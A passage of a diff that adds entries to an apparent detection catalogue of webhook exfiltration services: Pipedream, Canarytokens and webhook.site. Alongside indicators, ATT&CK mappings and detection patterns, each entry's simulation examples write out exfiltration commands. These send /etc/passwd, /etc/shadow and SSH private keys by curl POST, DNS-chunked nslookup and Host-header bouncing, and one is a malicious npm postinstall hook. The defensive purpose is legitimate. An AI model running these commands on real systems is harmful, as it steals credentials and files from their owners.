+        "notes": "Browser artifacts on attacker endpoint confirm use of Pipedream to create workflows and retrieve exfiltrated data."
+      },
+      {
+        "source": "DFIR",
+        "path": "Pipedream workflow event logs (attacker-side)",
+        "notes": "If attacker's Pipedream account is accessible, the workflow event history contains timestamped records of every HTTP request received — full request details including exfil data payloads."
+      }
+    ],
+    "network_indicators": [
+      "HTTP/HTTPS requests to *.m.pipedream.net or *.pipedream.net — workflow trigger endpoints receiving exfil data",
+      "POST requests with large or encoded body content to pipedream.net URLs from internal hosts",
+      "HTTP requests to diverse trusted domains with Host / X-Forwarded-For / Referer headers containing pipedream.net subdomains (data bouncing variant)",
+      "DNS resolution of pipedream.net subdomains from internal hosts",
+      "TLS connections with SNI containing pipedream.net from non-browser processes"
+    ],
+    "staging_behaviors": [
+      "Pipedream workflow created via web UI or API with HTTP trigger — attacker obtains unique *.m.pipedream.net URL",
+      "Target data collected, encoded (base64/hex/JSON), and prepared for HTTP POST to Pipedream endpoint",
+      "Optional: workflow configured to forward captured data to secondary storage (S3, Google Sheets, Slack, email)",
+      "Malicious package install script crafted to POST system info to Pipedream URL on npm install or pip install"
+    ],
+    "expected_child_processes": [
+      "curl / wget / Invoke-WebRequest (sending HTTP requests to pipedream.net endpoints with exfil data)",
+      "python3 / node / powershell (running scripts that POST data to Pipedream workflow triggers)",
+      "npm / pip (package managers executing malicious install scripts that exfiltrate to pipedream.net)",
+      "Browser process (accessing pipedream.com to create workflows and review captured events)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1567.001",
+        "name": "Exfiltration Over Web Service: Exfiltration to Code Repository",
+        "why": "Pipedream is a legitimate SaaS platform — exfiltrating data to it abuses a trusted web service, and TLS encryption to a known legitimate domain avoids triggering DLP/proxy alerts."
+      },
+      {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "why": "Exfil data is sent via standard HTTP/HTTPS POST to pipedream.net — indistinguishable from legitimate API webhook traffic at the protocol level."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "When used for data bouncing, outbound HTTP traffic appears as legitimate requests to trusted domains; the exfil payload in HTTP headers triggers callbacks to pipedream.net."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "In a data bouncing scenario, trusted web servers act as unwitting proxies — they relay exfil data via DNS/HTTP callbacks to the attacker's Pipedream endpoint."
+      },
+      {
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "why": "Pipedream endpoints are embedded in malicious npm/PyPI packages as exfil destinations — package install hooks POST system info to attacker-controlled Pipedream workflows."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Pipedream: Official platform — programmable HTTP webhook and workflow automation",
+        "url": "https://pipedream.com/",
+        "type": "report"
+      },
+      {
+        "label": "Checkmarx: Webhook Party — malicious npm/PyPI packages exfiltrating to pipedream.net and burpcollaborator.net",
+        "url": "https://checkmarx.com/blog/webhook-party-malicious-packages-caught-exfiltrating-data-via-legit-webhook-services/",
+        "type": "report"
+      },
+      {
+        "label": "Pipedream: RequestBin integration — HTTP endpoint creation and event inspection",
+        "url": "https://pipedream.com/requestbin",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries for OOB callback platforms",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Exfiltrate system info to Pipedream workflow via HTTP POST",
+        "command": "# 1. Create Pipedream workflow at pipedream.com with HTTP trigger\n# 2. Copy endpoint URL, e.g. https://abc123.m.pipedream.net\n# 3. On victim: POST system info\ncurl -X POST https://abc123.m.pipedream.net \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"hostname\\\":\\\"$(hostname)\\\",\\\"user\\\":\\\"$(whoami)\\\",\\\"ip\\\":\\\"$(curl -s ifconfig.me)\\\"}\"\n# 4. Check Pipedream workflow events for captured data"
+      },
+      {
+        "description": "Exfiltrate file contents to Pipedream via base64-encoded POST body",
+        "command": "# Encode and send file to Pipedream endpoint\nDATA=$(base64 -w0 /etc/passwd)\ncurl -X POST https://abc123.m.pipedream.net \\\n  -d \"data=${DATA}&file=passwd\""
+      },
+      {
+        "description": "Supply chain style — malicious npm postinstall exfil to Pipedream",
+        "command": "# Example malicious package.json postinstall hook (for awareness)\n# \"scripts\": {\n#   \"postinstall\": \"curl -X POST https://abc123.m.pipedream.net -d \\\"host=$(hostname)&user=$(whoami)&dir=$(pwd)&keys=$(cat ~/.ssh/id_rsa 2>/dev/null | head -5)\\\"\"\n# }"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*pipedream.net*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to pipedream.net in command line, script, config, or package manifest — indicates exfiltration to a Pipedream webhook endpoint",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-X POST*pipedream.net*",
+        "detect_type": "exfil_action",
+        "purpose": "HTTP POST to Pipedream workflow endpoint — direct data exfiltration via HTTP",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*Invoke-WebRequest*pipedream.net*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell HTTP request to Pipedream endpoint — Windows-native exfil",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*pipedream.net*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to pipedream.net — data bouncing via trusted intermediary",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject a pipedream.net subdomain — the trusted destination server may trigger a callback to the Pipedream endpoint."
+          }
+        ]
+      },
+      {
+        "pattern": "*postinstall*pipedream.net*",
+        "detect_type": "exfil_action",
+        "purpose": "Package manager install hook referencing pipedream.net — supply chain exfiltration pattern",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "HTTP/HTTPS POST to *.m.pipedream.net or *.pipedream.net",
+        "detect_type": "exfil_action",
+        "purpose": "HTTP POST to Pipedream workflow trigger — platform captures full request; body likely contains exfiltrated data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "TLS connection with SNI containing pipedream.net from non-browser process",
+        "detect_type": "exfil_action",
+        "purpose": "Non-browser process (curl, python, node, powershell) connecting to pipedream.net — suspicious unless part of a known CI/CD workflow",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing pipedream.net subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing variant — legitimate HTTP request carries pipedream.net in headers; trusted server may trigger callback to Pipedream",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS connection to pipedream.com from internal host",
+        "detect_type": "tool_execution",
+        "purpose": "Access to Pipedream web interface — operator creating workflows or reviewing captured exfil events",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "Pipedream, Inc."
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        80,
+        443
+      ],
+      "mutexes": []
+    }
+  },
+  {
+    "name": "Canarytokens (DNS/HTTP callback tokens)",
+    "category": "Data Bouncing",
+    "platform": "Any",
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration",
+    "overview": "Free digital tripwire service by Thinkst (canarytokens.org) that generates unique DNS hostnames and HTTP URLs which trigger alerts when resolved or accessed. Two core callback mechanisms: DNS tokens (*.canarytokens.com) fire on hostname resolution, and HTTP tokens (URLs on canarytokens.org or *.o3n.io) fire on HTTP access. In an exfiltration context, the DNS token mechanism can be repurposed as a lightweight data exfil collector — data encoded as subdomains prepended to a Canarytoken FQDN will be captured when resolved, either directly or via data bouncing through trusted intermediaries. HTTP tokens capture the requester's IP and request details. Canarytokens can also be embedded in Word docs, Excel files, PDFs, MySQL dumps, AWS API keys, WireGuard configs, and more — all triggering DNS/HTTP callbacks on access. Open-source (github.com/thinkst/canarytokens) and self-hostable. Listed in standard SIEM OAST detection rule sets alongside Interactsh and Burp Collaborator domains.",
+    "telemetry_overview": [
+      "DNS query logs for *.canarytokens.com subdomains",
+      "Proxy / firewall HTTP logs for connections to canarytokens.org / *.o3n.io",
+      "SIEM correlation rules for canarytokens.com in DNS queries",
+      "TLS inspection for SNI to canarytokens.org or o3n.io"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "DNS queries to *.canarytokens.com",
+        "notes": "DNS Canarytokens use unique FQDNs under canarytokens.com. Any resolution indicates a token was triggered. When repurposed for exfil, data is prepended as subdomain labels: encodeddata.TOKENID.canarytokens.com."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS requests to canarytokens.org or *.o3n.io",
+        "notes": "HTTP Canarytokens trigger on URL access. The token URL captures source IP, User-Agent, and request details. URLs follow formats like: canarytokens.org/TOKENPATH or HASH.o3n.io/images/TOKENID/spacer.gif."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Tokenized documents (Word, Excel, PDF) or config files on disk",
+        "notes": "Canarytokens can be embedded in Office docs, PDFs, MySQL dumps, .bash_history, .ssh/config, AWS credentials files, WireGuard configs. Opening these files triggers DNS/HTTP callbacks. Check for suspicious embedded URLs or hostnames."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Scripts or command history referencing canarytokens.com hostnames",
+        "notes": "Look for nslookup, dig, curl, or Resolve-DnsName commands targeting canarytokens.com subdomains — may indicate exfil setup or token-based data exfiltration."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS telemetry",
+        "notes": "Historical queries to *.canarytokens.com reveal when tokens were triggered. Subdomain labels may contain encoded exfil data if the token was repurposed for data exfiltration."
+      }
+    ],
+    "network_indicators": [
+      "DNS queries to *.canarytokens.com — either token trigger or data exfil via subdomain encoding",
+      "HTTP requests to canarytokens.org or *.o3n.io — HTTP token trigger capturing requester info",
+      "HTTP requests to trusted domains with Host/X-Forwarded-For/Referer headers containing canarytokens.com subdomains (data bouncing)",
+      "DNS queries with encoded subdomain labels prepended to a canarytokens.com FQDN"
+    ],
+    "staging_behaviors": [
+      "Canarytoken generated at canarytokens.org — attacker obtains unique DNS hostname and/or HTTP URL",
+      "Target data encoded (hex/base64) and chunked to fit DNS label limits before prepending to Canarytoken FQDN",
+      "Tokenized documents or config files placed as lures or used to detect investigator activity (anti-forensics)",
+      "Self-hosted Canarytokens server deployed for persistent collection on custom domain"
+    ],
+    "expected_child_processes": [
+      "nslookup / dig / Resolve-DnsName (resolving Canarytoken FQDNs — either triggering tokens or exfiltrating data via subdomains)",
+      "curl / wget / Invoke-WebRequest (accessing HTTP Canarytoken URLs or sending data-bounced requests with Canarytoken hostnames)",
+      "Microsoft Office / PDF reader / MySQL (opening tokenized documents that trigger embedded DNS/HTTP callbacks)",
+      "python3 / docker (self-hosting Canarytokens server from GitHub repository)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "DNS Canarytokens can be repurposed as exfil collectors — data encoded in subdomain labels of *.canarytokens.com is captured when the hostname is resolved, either directly or via data bouncing."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The DNS callback mechanism resolves attacker-controlled hostnames under canarytokens.com — data encoded in subdomains is delivered via DNS resolution."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "When used for data bouncing, outbound traffic to trusted domains carries Canarytoken hostnames in HTTP headers — the exfil morphs from HTTP to DNS via the trusted intermediary."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "In a data bouncing scenario, trusted web servers unwittingly relay exfil data via DNS lookup to canarytokens.com (confused deputy / CWE-441)."
+      },
+      {
+        "id": "T1027.006",
+        "name": "Obfuscated Files or Information: HTML Smuggling",
+        "why": "Canarytokens embedded in Office documents, PDFs, and config files are a form of information hiding — the callback mechanism is concealed within an otherwise normal-looking file."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Canarytokens.org: Free Canarytoken generation — DNS, HTTP, Word, Excel, PDF, AWS keys, and more",
+        "url": "https://canarytokens.org/",
+        "type": "report"
+      },
+      {
+        "label": "Thinkst: Canarytokens GitHub repository — open-source, self-hostable",
+        "url": "https://github.com/thinkst/canarytokens",
+        "type": "github"
+      },
+      {
+        "label": "Thinkst: Canarytoken Overview and Use Cases — DNS tokens, HTTP tokens, document tokens, AWS key tokens",
+        "url": "https://help.canary.tools/hc/en-gb/articles/10905485310109-Canarytoken-Overview-and-Use-Cases",
+        "type": "report"
+      },
+      {
+        "label": "Thinkst Blog: MySQL Canarytoken — DNS exfiltration primitive via database replication callbacks",
+        "url": "https://blog.thinkst.com/2021/09/a-mysql-canarytoken.html",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries including canarytokens.com alongside Interactsh and Burp Collaborator",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      },
+      {
+        "label": "Insider Threat Matrix: Canary Tokens anti-forensics — attackers using tokens to detect investigations",
+        "url": "https://insiderthreatmatrix.org/articles/AR5/sections/AF018/subsections/AF018.003",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Generate a DNS Canarytoken and use it for data exfiltration via subdomain encoding",
+        "command": "# 1. Visit canarytokens.org > select 'DNS token' > create\n# 2. Receive FQDN e.g. abc123.canarytokens.com\n# 3. On victim: exfiltrate data via DNS subdomains\nfor chunk in $(cat /etc/passwd | xxd -p | fold -w 40); do\n  nslookup ${chunk}.abc123.canarytokens.com\ndone\n# 4. Each DNS resolution is logged by the Canarytokens server with the full subdomain"
+      },
+      {
+        "description": "Data bouncing through trusted domain Host header to Canarytoken DNS",
+        "command": "# Bounce exfil data through trusted domains — trusted server resolves the Canarytoken hostname\nfor chunk in $(cat secret.txt | base64 -w0 | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.abc123.canarytokens.com\" https://trusted-domain.com\ndone"
+      },
+      {
+        "description": "Self-host Canarytokens server for persistent exfil collection on custom domain",
+        "command": "# Clone and deploy self-hosted Canarytokens\ngit clone https://github.com/thinkst/canarytokens-docker.git\ncd canarytokens-docker\n# Configure with your domain in .env and frontend.env\ndocker-compose up -d\n# Generate DNS tokens on your custom domain for exfil collection"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*canarytokens.com*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to canarytokens.com in command line, script, or config — indicates Canarytoken usage for exfil, data bouncing, or anti-forensics tripwire",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*canarytokens.org*",
+        "detect_type": "tool_execution",
+        "purpose": "Reference to Canarytokens web platform — operator generating tokens or checking alerts",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*o3n.io*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to o3n.io — Canarytokens HTTP callback domain used for web bug and document tokens",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "nslookup*canarytokens.com*",
+        "detect_type": "exfil_action",
+        "purpose": "DNS query to Canarytoken FQDN — token trigger or data exfil via encoded subdomains",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*canarytokens.com*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to canarytokens.com — data bouncing via trusted intermediary",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject a canarytokens.com subdomain containing exfil data — the trusted server may DNS-resolve this hostname, delivering data to the Canarytokens server."
+          }
+        ]
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "DNS query to *.canarytokens.com",
+        "detect_type": "exfil_action",
+        "purpose": "DNS resolution of a Canarytoken hostname — either a token trigger or data exfiltration via encoded subdomain labels",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS request to canarytokens.org or *.o3n.io",
+        "detect_type": "exfil_action",
+        "purpose": "HTTP Canarytoken callback — captures source IP and request details; may contain exfil data in URL path or headers",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing canarytokens.com subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing — legitimate HTTP request carries Canarytoken hostname in Host header; trusted server performs DNS lookup delivering data to Canarytokens server",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS connection to canarytokens.org from internal host",
+        "detect_type": "tool_execution",
+        "purpose": "Access to Canarytokens web interface — operator generating tokens or checking triggered alerts",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "Thinkst Applied Research"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443
+      ],
+      "mutexes": []
+    }
+  },
+  {
+    "name": "webhook.site (instant HTTP/DNS webhook collector)",
+    "category": "Data Bouncing",
+    "platform": "Any",
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration",
+    "overview": "Free web-based HTTP and DNS request inspection service that instantly generates a unique URL (webhook.site/TOKEN-UUID) and DNS subdomain for capturing incoming requests with full headers, body, query parameters, and source IP. No account required — an endpoint is ready in seconds. In an exfiltration context, attackers POST stolen data directly to the webhook URL or use the DNS subdomain for data bouncing via encoded subdomain labels. Explicitly named in MITRE ATT&CK T1567.004 (Exfiltration Over Webhook) alongside Discord and Slack. Heavily abused in real-world campaigns: APT28 (Fancy Bear) used webhook.site as both C2 and exfil infrastructure in Operation MacroMaze (2025-2026) targeting European entities; info-stealers like Hazard-Token-Grabber-V2 exfiltrate credentials and system info via JSON POST to webhook.site; and malicious npm/PyPI packages use it for supply chain exfiltration. MITRE ATT&CK detection strategy DET0153 specifically covers webhook.site exfiltration patterns.",
+    "telemetry_overview": [
+      "Proxy / firewall HTTP logs for connections to webhook.site",
+      "DNS query logs for *.dnshook.site or webhook.site subdomains",
+      "SIEM correlation rules for webhook.site as exfil destination",
+      "TLS inspection for SNI to webhook.site",
+      "EDR process telemetry — which process is POSTing to webhook.site"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS requests to webhook.site/TOKEN-UUID",
+        "notes": "webhook.site captures all HTTP methods (GET, POST, PUT, etc.) with full headers, body, and query parameters. Exfil data typically arrives as JSON POST body, base64-encoded form data, or URL path parameters. Token UUIDs are in standard UUID4 format."
+      },
+      {
+        "source": "Network",
+        "path": "DNS queries to *.dnshook.site",
+        "notes": "webhook.site provides DNS callback subdomains under dnshook.site. Data encoded in subdomain labels is captured when resolved — same mechanism as Interactsh/dnslog.cn."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Scripts, malware, or command history referencing webhook.site URLs",
+        "notes": "Look for curl, wget, Invoke-WebRequest, Python requests, or Edge/Chrome headless mode commands targeting webhook.site. APT28 used Edge headless to exfiltrate command output via HTML form submission to webhook.site."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Malicious Office documents with INCLUDEPICTURE fields pointing to webhook.site",
+        "notes": "APT28 Operation MacroMaze embedded webhook.site URLs in Word document XML — INCLUDEPICTURE fields fetch remote images acting as tracking pixels confirming document access."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Scheduled tasks or persistence mechanisms referencing webhook.site",
+        "notes": "APT28 created scheduled tasks to periodically execute commands and exfiltrate output to webhook.site — check Task Scheduler for webhook.site references."
+      },
+      {
+        "source": "DFIR",
+        "path": "Browser cache / history showing webhook.site access",
+        "notes": "On attacker endpoint: webhook.site web UI shows captured requests in real-time. On victim endpoint: Edge headless browsing cache may contain webhook.site artifacts from APT28-style exfil chains."
+      }
+    ],
+    "network_indicators": [
+      "HTTP/HTTPS POST to webhook.site/TOKEN-UUID — direct data exfiltration via webhook endpoint",
+      "DNS queries to *.dnshook.site — DNS callback variant for data bouncing or direct DNS exfil",
+      "HTTP requests to trusted domains with Host/X-Forwarded-For/Referer headers containing webhook.site or dnshook.site subdomains",
+      "Non-browser process (powershell, python, curl, msedge --headless) connecting to webhook.site",
+      "Office document fetching remote image from webhook.site URL on open (INCLUDEPICTURE tracking pixel)"
+    ],
+    "staging_behaviors": [
+      "webhook.site endpoint created via web UI — attacker obtains unique UUID-based URL in seconds, no registration needed",
+      "Target data collected and encoded (JSON, base64, hex) for HTTP POST to webhook.site",
+      "APT28 pattern: macro drops VBS/BAT/CMD/HTM files, scheduled task executes commands, Edge headless renders HTML form that auto-submits output to webhook.site",
+      "Info-stealer pattern: Python script collects credentials, tokens, browser data, and POSTs as JSON to webhook.site endpoint"
+    ],
+    "expected_child_processes": [
+      "curl / wget / Invoke-WebRequest (HTTP POST to webhook.site with exfil data)",
+      "python3 / node (info-stealer scripts POSTing JSON to webhook.site)",
+      "msedge.exe --headless (APT28 technique — Edge renders HTML form that auto-submits to webhook.site)",
+      "wscript.exe / cscript.exe (VBScript launcher in APT28 macro chain)",
+      "cmd.exe / powershell.exe (batch scripts collecting system info for exfil)",
+      "Browser process (accessing webhook.site web UI to view captured data)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1567.004",
+        "name": "Exfiltration Over Web Service: Exfiltration Over Webhook",
+        "why": "webhook.site is explicitly named in this MITRE ATT&CK sub-technique — adversaries POST staged data directly to webhook.site URLs for exfiltration over HTTPS to a legitimate service."
+      },
+      {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "why": "Exfil data is sent via standard HTTPS POST to webhook.site — indistinguishable from legitimate webhook traffic at the protocol level."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "webhook.site's DNS callback feature (dnshook.site) captures DNS queries — data encoded in subdomain labels is collected on resolution."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "When used for data bouncing, outbound HTTP to trusted domains carries webhook.site hostnames in headers — the exfil morphs from HTTP to DNS via the trusted intermediary."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "In a data bouncing scenario, trusted web servers act as unwitting proxies relaying exfil data to webhook.site/dnshook.site via DNS lookup (confused deputy / CWE-441)."
+      },
+      {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "why": "APT28 Operation MacroMaze used CMD/BAT scripts to execute system commands and exfiltrate output to webhook.site via Edge headless rendering."
+      }
+    ],
+    "refs": [
+      {
+        "label": "MITRE ATT&CK: T1567.004 Exfiltration Over Webhook — webhook.site explicitly named as exfil service",
+        "url": "https://attack.mitre.org/techniques/T1567/004/",
+        "type": "report"
+      },
+      {
+        "label": "MITRE ATT&CK: DET0153 Detection Strategy for Exfiltration Over Webhook — detection patterns for webhook.site",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0153/",
+        "type": "report"
+      },
+      {
+        "label": "SecurityAffairs: Operation MacroMaze — APT28 using webhook.site for C2 and data exfiltration against European targets",
+        "url": "https://securityaffairs.com/188421/apt/operation-macromaze-apt28-exploits-webhooks-for-covert-data-exfiltration.html",
+        "type": "report"
+      },
+      {
+        "label": "The Hacker News: APT28 Targeted European Entities Using Webhook-Based Macro Malware",
+        "url": "https://thehackernews.com/2026/02/apt28-targeted-european-entities-using.html",
+        "type": "report"
+      },
+      {
+        "label": "SANS ISC: Info-Stealer Using webhook.site to Exfiltrate Data — Hazard-Token-Grabber-V2 analysis",
+        "url": "https://isc.sans.edu/diary/InfoStealer+Using+webhooksite+to+Exfiltrate+Data/28088",
+        "type": "report"
+      },
+      {
+        "label": "Checkmarx: Webhook Party — malicious packages exfiltrating to webhook services including pipedream.net and burpcollaborator.net",
+        "url": "https://checkmarx.com/blog/webhook-party-malicious-packages-caught-exfiltrating-data-via-legit-webhook-services/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Exfiltrate system info via JSON POST to webhook.site",
+        "command": "# 1. Visit webhook.site — unique URL is generated instantly, e.g. https://webhook.site/abc-def-123\n# 2. On victim: POST system info\ncurl -X POST https://webhook.site/abc-def-123 \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"hostname\\\":\\\"$(hostname)\\\",\\\"user\\\":\\\"$(whoami)\\\",\\\"ip\\\":\\\"$(curl -s ifconfig.me)\\\",\\\"ssh_keys\\\":\\\"$(cat ~/.ssh/id_rsa 2>/dev/null | head -3)\\\"}\"\n# 3. Check webhook.site web UI for captured request"
+      },
+      {
+        "description": "Exfiltrate file via base64-encoded POST to webhook.site",
+        "command": "# Encode and send sensitive file\nDATA=$(base64 -w0 /etc/shadow)\ncurl -X POST https://webhook.site/abc-def-123 \\\n  -d \"file=shadow&data=${DATA}\""
+      },
+      {
+        "description": "Data bouncing through trusted domain Host header to webhook.site DNS callback",
+        "command": "# Use dnshook.site subdomain for DNS-based data bouncing\nfor chunk in $(cat secret.txt | xxd -p | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.TOKEN.dnshook.site\" https://trusted-domain.com\ndone"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*webhook.site*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to webhook.site in command line, script, document XML, config, or scheduled task — indicates exfiltration or C2 via webhook endpoint",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*dnshook.site*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to dnshook.site — webhook.site's DNS callback domain for DNS-based data exfiltration",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-X POST*webhook.site*",
+        "detect_type": "exfil_action",
+        "purpose": "HTTP POST to webhook.site — direct data exfiltration via webhook endpoint",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*Invoke-WebRequest*webhook.site*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell HTTP request to webhook.site — Windows-native exfil",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "msedge*--headless*webhook.site*",
+        "detect_type": "exfil_action",
+        "purpose": "Edge headless mode targeting webhook.site — APT28 Operation MacroMaze technique for stealthy HTML form-based exfiltration",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "INCLUDEPICTURE*webhook.site*",
+        "detect_type": "exfil_action",
+        "purpose": "Word document XML containing INCLUDEPICTURE field pointing to webhook.site — APT28 tracking pixel / beacon technique",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "HTTP/HTTPS POST to webhook.site",
+        "detect_type": "exfil_action",
+        "purpose": "Direct data exfiltration via HTTP POST to webhook.site endpoint — body contains exfil data (JSON, base64, form data)",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "DNS query to *.dnshook.site",
+        "detect_type": "exfil_action",
+        "purpose": "DNS callback to webhook.site's DNS service — subdomain labels may contain encoded exfil data chunks",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP GET to webhook.site from Office process (WINWORD.EXE, EXCEL.EXE)",
+        "detect_type": "exfil_action",
+        "purpose": "Office document fetching remote image from webhook.site — INCLUDEPICTURE tracking pixel / beacon confirming document was opened (APT28 technique)",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "TLS connection with SNI webhook.site from non-browser process (powershell, python, curl, msedge --headless)",
+        "detect_type": "exfil_action",
+        "purpose": "Non-interactive process connecting to webhook.site — suspicious unless part of a known CI/CD or development workflow",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing webhook.site or dnshook.site",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing variant — legitimate HTTP carries webhook.site hostname in headers; trusted server may trigger DNS callback",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
